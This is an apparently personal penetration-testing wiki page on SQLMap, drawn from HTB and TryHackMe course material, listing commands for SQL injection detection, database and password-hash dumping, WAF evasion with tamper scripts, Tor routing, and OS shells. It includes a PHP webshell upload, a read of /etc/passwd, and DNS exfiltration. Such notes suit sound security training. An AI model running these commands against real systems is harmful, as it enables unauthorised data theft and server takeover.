---
title: "SQLMap"
type: tool
tags: [exploitation, htb, scanner, thm, tool, web]
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [cpts-sqlmap, thm-sqlmap]
phase: exploit
---

## Purpose

SQLMap is an open-source Python tool that automates detection and exploitation of SQL injection vulnerabilities, supporting all major database backends and injection techniques.

## Install / Setup

```bash
sudo apt install sqlmap

# Latest dev version
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
python sqlmap-dev/sqlmap.py -h
```

### Basic detection

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1"          # GET parameter
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch  # non-interactive, accept defaults
```

### POST requests

```bash
sqlmap -u "http://www.example.com/" --data "uid=1&name=test"
sqlmap -u "http://www.example.com/" --data "uid=1*&name=test"   # mark injection point with *
```

### Request file (from Burp)

Save the raw HTTP request to a file, then:

```bash
sqlmap -r req.txt
sqlmap -r req.txt -p id          # test specific parameter
```

Mark the injection point inside the request file with `*`:

```
GET /?id=* HTTP/1.1
Host: www.example.com
```

### Converting a curl command

Copy as cURL from browser DevTools, replace `curl` with `sqlmap`:

```bash
sqlmap 'http://www.example.com/?id=1' \
  -H 'User-Agent: Mozilla/5.0 ...' \
  -H 'Cookie: PHPSESSID=abc123'
```

### Custom headers and cookies

```bash
sqlmap -u URL --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap -u URL -H 'Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap -u URL --cookie="id=1*"   # inject inside a cookie value
sqlmap -u URL --random-agent     # randomise User-Agent
sqlmap -u URL --mobile           # use smartphone User-Agent
sqlmap -u URL --method PUT       # non-standard HTTP method
```

### Basic DB info

```bash
sqlmap -u URL --banner           # DBMS version
sqlmap -u URL --current-user     # current DB user
sqlmap -u URL --current-db       # current database
sqlmap -u URL --is-dba           # check if DBA privileges
sqlmap -u URL --banner --current-user --current-db --is-dba   # all at once
sqlmap -u URL --dbs              # list all databases
sqlmap -u URL --passwords        # dump DBMS user password hashes (auto-cracks)
```

### Tables and columns

```bash
sqlmap -u URL --tables -D testdb                        # list tables in database
sqlmap -u URL --columns -T users -D testdb              # list columns in table
sqlmap -u URL --schema                                  # full DB schema (all tables)
sqlmap -u URL --dump -T users -D testdb                 # dump table
sqlmap -u URL --dump -T users -D testdb -C name,surname # specific columns only
sqlmap -u URL --dump -T users -D testdb --start=2 --stop=3  # row range
sqlmap -u URL --dump -T users -D testdb --where="name LIKE 'f%'"  # WHERE filter
sqlmap -u URL --dump -D testdb                          # dump entire database
sqlmap -u URL --dump-all --exclude-sysdbs               # dump all non-system DBs
```

### Searching

```bash
sqlmap -u URL --search -T user   # find tables matching 'user' (LIKE)
sqlmap -u URL --search -C pass   # find columns matching 'pass'
```

### Level and risk

```bash
# --level 1-5 (default 1): increases boundaries/payloads
# --risk  1-3 (default 1): increases risk of side effects (e.g. OR-based payloads)
sqlmap -u URL --level=5 --risk=3
```

Default level 1, risk 1: ~72 payloads. Level 5, risk 3: ~7865 payloads.

### Technique selection

```bash
# B=boolean-blind E=error U=union S=stacked T=time-blind Q=inline
sqlmap -u URL --technique=BEU    # skip time-based and stacked
```

### Tamper scripts

```bash
sqlmap -u URL --tamper=between                        # replace > and = with BETWEEN
sqlmap -u URL --tamper=randomcase                     # randomise keyword case
sqlmap -u URL --tamper=space2comment                  # replace spaces with /**/
sqlmap -u URL --tamper=between,randomcase             # chain multiple tampers
sqlmap -u URL --list-tampers                          # show all available tampers
```

Notable tamper scripts:

| Tamper | Effect |
|---|---|
| `between` | Replaces `>` with `NOT BETWEEN 0 AND #`, `=` with `BETWEEN # AND #` |
| `randomcase` | Randomises keyword case (`SELECT` → `SEleCt`) |
| `space2comment` | Replaces spaces with `/**/` |
| `base64encode` | Base64-encodes the full payload |
| `versionedmorekeywords` | Wraps each keyword in MySQL versioned comments |
| `modsecurityversioned` | Wraps full query in MySQL versioned comment |
| `percentage` | Adds `%` prefix to each character (`SELECT` → `%S%E%L%E%C%T`) |

### User-agent and WAF detection

```bash
sqlmap -u URL --random-agent     # avoid default sqlmap UA blacklisting
sqlmap -u URL --skip-waf         # skip WAF detection heuristic
```

### CSRF token bypass

```bash
sqlmap -u URL --data="id=1&csrf-token=abc123" --csrf-token="csrf-token"
```

### Proxy routing

```bash
sqlmap -u URL --proxy="socks4://177.39.187.70:33283"
sqlmap -u URL --proxy-file proxies.txt    # rotate through list
sqlmap -u URL --tor                       # route through Tor (SOCKS4 on 9050)
sqlmap -u URL --check-tor                 # verify Tor is working
```

### Routing through Burp for debugging

```bash
sqlmap -u URL --proxy="http://127.0.0.1:8080"
```

### Other tuning flags

```bash
sqlmap -u URL --prefix="%'))" --suffix="-- -"   # custom payload boundaries
sqlmap -u URL --union-cols=17                    # hint column count for UNION
sqlmap -u URL --string=success                   # use string to distinguish TRUE/FALSE
sqlmap -u URL --code=200                         # use HTTP code to distinguish
sqlmap -u URL --text-only                        # compare only visible text
sqlmap -u URL --randomize=rp                     # randomise parameter to bypass unique-value checks
sqlmap -u URL --eval="import hashlib; h=hashlib.md5(id).hexdigest()"  # computed param
sqlmap -u URL --chunked                          # chunked POST to split keywords
```

## OS Interaction

```bash
# OS shell (requires FILE privilege and stacked queries or error-based)
sqlmap -u URL -p email --os-shell

# File read
sqlmap -u URL --file-read="/etc/passwd"

# File write (upload webshell)
sqlmap -u URL --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"
```

## Debugging and Output

```bash
sqlmap -u URL --parse-errors       # print DBMS errors in output
sqlmap -u URL -t /tmp/traffic.txt  # save all HTTP traffic to file
sqlmap -u URL -v 3                 # verbosity (0-6); -v 3 shows payloads
sqlmap -u URL -v 6 --batch         # full debug output
```

Output/sessions are saved in `~/.sqlmap/output/<target>/`.

## THM — OS Shell via SQLi

Demonstrates getting an OS shell via a vulnerable login endpoint:

```bash
sqlmap -u "http://TARGET_IP/ai/includes/user_login.php?email=test%40chatai.com&password=123" \
  -p email --os-shell
```

## Tips and Gotchas

- Use `--batch` in automated pipelines to avoid interactive prompts (accepts defaults).
- Marking a specific parameter with `*` (e.g., `uid=1*`) focuses sqlmap on that parameter instead of testing all.
- `--dump` auto-recognises password hashes and offers dictionary-based cracking with a built-in 1.4M wordlist.
- `-r req.txt` is the cleanest way to handle complex requests with unusual headers or JSON/XML bodies.
- `--technique=T` (time-based only) is slower but works when blind injection is the only option on non-query statements (`INSERT`, `UPDATE`).
- `--os-shell` requires `FILE` privilege and a writable web directory; it uses stacked queries or error-based injection.
- Raising `--level` and `--risk` above defaults significantly slows the scan; start with defaults and escalate if needed.
- SQLMap's default User-Agent (`sqlmap/1.x`) is blocked by many WAFs; always use `--random-agent` for real assessments.
- `--all --batch` dumps everything accessible automatically; useful for CTFs but very slow and noisy.

## Related Techniques

- [[sql-injection]]
- [[wiki/cheatsheets/recon]]
- [[path-traversal-lfi]]

## Sources

- CPTS SQLMap Essentials module (HTB Academy)
- TryHackMe: Weaponizing Vulnerabilities MySQL
- Source files: `/raw/assets/courses/CPTS/17. SQLMap/`, `/raw/assets/courses/TryHackMe/6. THM tools/Linux/sqlmap/`

## Core usage

Test a GET parameter for SQL injection non-interactively:

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

## --ignore-stdin over non-TTY drivers

Run over a non-TTY stdin (an `ssh host "sqlmap ..."` pipe, an agent/CI driver), sqlmap
detects the piped stdin, and silently discards the `-r` request file: the run proceeds,
tests the wrong thing or nothing, and can end in a false negative. Always add
`--ignore-stdin` when stdin is not a terminal:

```sh
ssh user@host "sqlmap -r req.txt --ignore-stdin --dbms=mysql --technique=E --batch"
```

Error-based verdicts (`GTID_SUBSET`-family on MySQL) come back fine this way on dup-check
sinks where time-based heuristics stay silent.

<!-- promoted-slug: sqlmap-ignore-stdin-non-tty -->

## Enumeration deltas: dump formats, inband vs blind speed

- `--dump-format=CSV|HTML|SQLite`: dumps default to CSV under `~/.sqlmap/output/<target>/dump/`; SQLite output lets you re-open the whole dumped DB locally in `sqlite3` and query it (huge for wide tables where console output is unusable).
- Speed model: sqlmap keeps two query variants per item. Inband (`UNION`/error-based) fetches whole result sets per request; blind (boolean/time) walks every value row-by-row, character-by-character, bit-by-bit. So a dump that takes seconds over UNION can take an hour over time-based; prefer `--technique=BEU` while enumerating whenever those channels are open, and save `T` for final extraction when nothing else exists.
- `--dump` auto-recognises hash columns and offers to crack (31 hash families, built-in ~1.4M-entry wordlist); answer N to both prompts and export the hashes to hashcat when you have better wordlists/rules.
- DB `root`/DBA is privileged INSIDE the DBMS only; it says nothing about OS-level rights, and modern deployments keep OS privileges minimal even for DBA users. `--is-dba` predicts FILE privilege, not shells.

<!-- promoted-slug: sqlmap-enum-delta -->

## OS access deltas: file-read fallback, os-shell flow, technique=E

Gate first: `--is-dba`. `current user is DBA: True` is the green light for file ops; on False, `--file-read` typically dies with `no data retrieved`.

File read: on failure sqlmap automatically falls back from the slow technique to plain UNION; if it still warns about `continuous data retrieval problems`, rerun with `--no-cast` or `--hex`. Successful reads land as `~/.sqlmap/output/<target>/files/<name>`.

File write prerequisites (MySQL): `INTO OUTFILE` needs `secure_file_priv` empty/disabled AND a directory the DB user can write AND the web server can read. Check it in-band first:

```sql
SELECT @@secure_file_priv;
```

`--os-shell` interactive flow (what the prompts mean, `--batch` picks the defaults):

1. Asks the web language (ASP/ASPX/JSP/PHP) - it needs this to pick the stager format.
2. Asks for the webroot: common locations list (`/var/www/`, `/var/www/html/`, `/usr/local/apache2/htdocs`, ...), custom path, a list file, or brute-force search. It first tries full-path disclosure from error pages.
3. Uploads a randomly named stager + backdoor pair (e.g. `tmpumgzr.php`) via `LIMIT ... LINES TERMINATED BY` file-write, then drops you into `os-shell>`. Quit with `x`/`q`.

Technique fallback: `--os-shell` over UNION can come up as `No output`. Rerun forcing error-based, which returns output in-band:

```sh
sqlmap -u "http://TARGET/?id=1" --os-shell --technique=E
```

Manual webshell alternative when os-shell's stager fails but file-write works:

```sh
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u "http://TARGET/?id=1" --file-write shell.php --file-dest "/var/www/html/shell.php"
curl "http://TARGET/shell.php?cmd=id"
```

<!-- promoted-slug: sqlmap-os-shell-flow -->

## Reading sqlmap scan output

What the log lines mean while a run is going (they tell you the injection type before it finishes, and what to write in the report):

- `target URL content is stable`: identical repeated requests return near-identical responses, so TRUE/FALSE diffs are meaningful. Unstable targets still work; sqlmap strips the noise.
- `parameter 'id' appears to be dynamic`: value changes DO change the response, so the param likely reaches a query. A static response means the value is not processed here.
- `heuristic (basic) test shows ... might be injectable (possible DBMS: 'MySQL')`: an intentionally invalid value (e.g. `1",)..).))'`) produced a DBMS error. An indication, not proof; the full test follows. It also names the likely DBMS, so accept the "skip other DBMS payloads" prompt (Y).
- `heuristic (XSS) test shows ... might be vulnerable`: free side-check sqlmap runs on every param; worth noting when no SQLi is found.
- `reflective value(s) found and filtering out`: payload fragments are echoed back in the page; sqlmap filters them before comparing (echoed junk would break the diff).
- `parameter 'id' appears to be 'AND boolean-based blind' injectable (with --string="...")`: sqlmap found a constant string that appears only in TRUE responses; that is a hard oracle, not a fuzzy diff, so this finding is low false-positive risk.
- `time-based comparison requires a larger statistical model`: sqlmap is collecting baseline response times to distinguish a deliberate delay from jitter, works even on high-latency links. Wait it out.
- `automatically extending ranges for UNION query ... tests` / `'ORDER BY' technique appears to be usable`: UNION checks are request-capped (10) until another technique looks promising, then the cap lifts; ORDER BY usability lets it binary-search the column count fast.
- `parameter 'id' is vulnerable`: confirmed. Answer `N` to "keep testing others" unless you need every injectable param for the report.
- Final block `sqlmap identified the following injection point(s)`: only PROVABLY exploitable points are listed (type, title, payload). Copy these payloads as the manual PoC.

Session caching: everything found is stored under `~/.sqlmap/output/<target>/`; subsequent runs resume the injection point from the session file and skip detection entirely. Use `--fresh-queries` when you need it to re-fetch instead of trusting cached results.

<!-- promoted-slug: sqlmap-output-reading -->

## Protection-bypass deltas: CSRF, WAF fingerprint, HPP, tamper ordering

CSRF tokens: besides `--csrf-token=<param>`, sqlmap AUTO-DETECTS the token: if any provided parameter name contains `csrf`, `xsrf` or `token`, it prompts to refresh that param per request (parses fresh values out of each response). So a form with `t0ken=...` just needs a `y` at the prompt, or `--csrf-token=t0ken` with `--batch`.

WAF fingerprint mechanics: the very first thing sqlmap does is send one malicious payload under a non-existent parameter name (e.g. `?pfov=...`) and diff the response. A big change means a protection layer (ModSecurity typically answers `406 Not Acceptable`); identification then runs through the identYwaf signature set (~80 WAFs). `--skip-waf` suppresses this pre-test when you want a quieter start. If the first responses are 5xx, suspect default-UA blacklisting and reach for `--random-agent` before anything else.

HTTP parameter pollution: same idea as `--chunked` but in the URL/form body. Split the payload across repeated same-name parameters; platforms that concatenate duplicates (classic ASP/ASP.NET) reassemble it server-side while the WAF sees only fragments:

```text
?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users
```

Tamper script mechanics worth knowing:

- Chained tampers (`--tamper=between,randomcase`) do NOT run in the order typed; each has a predefined priority so syntax-rewriting scripts (e.g. `ifnull2ifisnull`) run before content-agnostic ones (e.g. `appendnullbyte`).
- A tamper is just a Python `tamper(payload, **kwargs)` function returning the modified payload; write a custom one when the target needs a bespoke transform (classic use: second-order SQLi, where the payload must survive storage and execute on a later page).
- `--list-tampers` prints every built-in script with its description; pick by what the filter blocks (`=` -> `between`/`equaltolike`, spaces -> `space2*` family, case-match -> `randomcase`, ModSecurity -> `modsecurityversioned`/`zeroversioned`).

<!-- promoted-slug: sqlmap-protection-bypass-delta -->

## Tuning deltas: payload anatomy, OR payloads, UNION hints

Payload anatomy: every request sqlmap sends is a `vector` (the SQL it wants executed, e.g. `UNION ALL SELECT 1,2,VERSION()`) wrapped in `boundaries` (prefix/suffix pair that lands the vector inside the vulnerable statement). `--level` widens both sets; `--risk` widens the vectors.

- Login/auth injection points usually need `OR` payloads (`' OR 1=1`), which only run at `--risk=2`+. Reason: `OR` against an `UPDATE`/`DELETE` statement can modify or wipe rows, so risk 1 excludes them. Raise risk for login forms, keep it low against anything that writes.
- `-v 3` prints each `[PAYLOAD]` line as it is tried; compare runs at different level/risk to see which boundaries are being added.

Comparison/detection helpers (when the target is noisy or the oracle is unusual):

```sh
sqlmap -u URL --titles          # compare only the HTML <title> (heavy dynamic content)
sqlmap -u URL --string=success  # TRUE responses contain this string, FALSE do not
sqlmap -u URL --code=200        # TRUE = 200, FALSE = 500, use the status code as oracle
sqlmap -u URL --text-only       # strip HTML tags, compare visible text only
```

UNION-specific hints:

```sh
sqlmap -u URL --union-cols=5   # known column count, skips the search
sqlmap -u URL --union-char=a   # default fillers (NULL / random int) break the query; use a compatible dummy
sqlmap -u URL --union-from=users  # Oracle (and friends) need a FROM <table> appendix
```

Data-retrieval problem flags (sqlmap itself suggests these on failure; set them up front when the target has bad bytes or binary columns):

```sh
sqlmap -r req.txt --no-cast          # skip CAST(... AS NCHAR); needed when casting corrupts/encodes the data
sqlmap -r req.txt --hex              # retrieve data as hex, decode locally; reliable for binary/bad-byte content
sqlmap -r req.txt --binary-fields=content  # mark specific columns binary (e.g. blob/file content)
sqlmap -r req.txt --fresh-queries    # ignore cached session results, re-fetch
sqlmap -r req.txt --time-sec=1       # shorten the time-based delay (default 5s); a 1s oracle still works and is far faster
```

Out-of-band mode: when every in-band channel is closed and time-based is too slow, sqlmap can exfiltrate via DNS. Run it on a host that is authoritative DNS for a domain you control and pass `--dns-domain=yourdomain.com`; results come back as subdomain lookups (`<answer>.yourdomain.com`), one query chunk per lookup.

<!-- promoted-slug: sqlmap-tuning-delta -->
